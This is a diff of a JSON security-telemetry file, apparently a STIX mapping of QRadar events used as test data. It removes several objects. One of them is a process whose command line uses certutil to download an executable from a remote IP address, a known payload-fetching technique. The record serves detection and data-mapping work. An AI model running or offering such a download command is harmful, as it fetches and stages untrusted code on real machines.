@@ -49,44 +49,7 @@
                     "type": "user-account",
                     "user_id": "Luis"
                 },
-                "6": {
-                    "type": "artifact",
-                    "payload_bin": "rozwalTO"
-                },
-                "7": {
-                    "type": "file",
-                    "hashes": {
-                        "SHA-1": "10CE9174BFF4856083E6ADAD0094A798CED2C079",
-                        "MD5": "7B973145F7E1B59330CA4DD1F86B3D55",
-                        "SHA-256": "589229E2BD93100049909EDF9825DCE24FF963A0C465D969027DB34E2EB878B4",
-                        "imp": "7A272B918680EE931C6FD622CAFBA542"
-                    },
-                    "name": "certutil.exe",
-                    "parent_directory_ref": "8"
-                },
-                "8": {
-                    "type": "directory",
-                    "path": "C:\\Windows\\System32\\certutil.exe"
-                },
-                "9": {
-                    "type": "process",
-                    "binary_ref": "7",
-                    "command_line": "certutil -urlcache -split -f http://67.229.97.229/c64.exe c64.exe",
-                    "cwd": "C:\\Windows\\system32\\",
-                    "pid": 744
-                },
-                "10": {
-                    "type": "directory",
-                    "path": "C:\\Windows\\System32\\cmd.exe"
-                },
-                "11": {
-                    "type": "file",
-                    "parent_directory_ref": "10",
-                    "contains_refs": "7",
-                    "name": "cmd.exe"
-                }
-            },
-            "x_com_ibm_ariel": {
+                            "x_com_ibm_ariel": {
                 "devicetype": 12,
                 "qid_name": "Process Create",
                 "qid": 5001828,
